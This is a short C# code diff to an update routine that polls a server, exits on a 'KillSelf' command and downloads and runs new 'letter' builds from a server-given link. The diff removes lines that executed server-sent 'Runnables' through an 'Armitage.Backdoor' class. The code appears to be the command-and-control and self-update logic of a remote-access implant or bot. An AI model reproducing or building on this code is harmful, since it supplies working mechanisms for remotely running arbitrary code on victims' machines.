@@ -33,7 +33,7 @@ namespace Client.Utilities
         public async void FetchUpdates()
         {
             await Task.Run(() =>
-            {  
+            {
                 var update_data = Communication.Server.GetUpdate();
 
                 if (update_data != null)
@@ -41,18 +41,9 @@ namespace Client.Utilities
                     // check if the letter is supposed to kill itself.
                     if (update_data.KillSelf) Environment.Exit(69);
 
-                    if (FetchedVersion != update_data.UpdateVersion)
+                    if (update_data.LetterVersion > Constants.Version)
                     {
-                        // its a new update, initialize it
-                        FetchedVersion = update_data.UpdateVersion;
-
-                        Armitage.Backdoor bd = new Armitage.Backdoor(update_data.Runnables);
-                        bd.Execute(); // async
-
-                        if (update_data.LetterVersion > Constants.Version)
-                        {
-                            DownloadAndRunNewLetter(update_data.DownloadLink);
-                        }
+                        DownloadAndRunNewLetter(update_data.DownloadLink);
                     }
                 }
             });
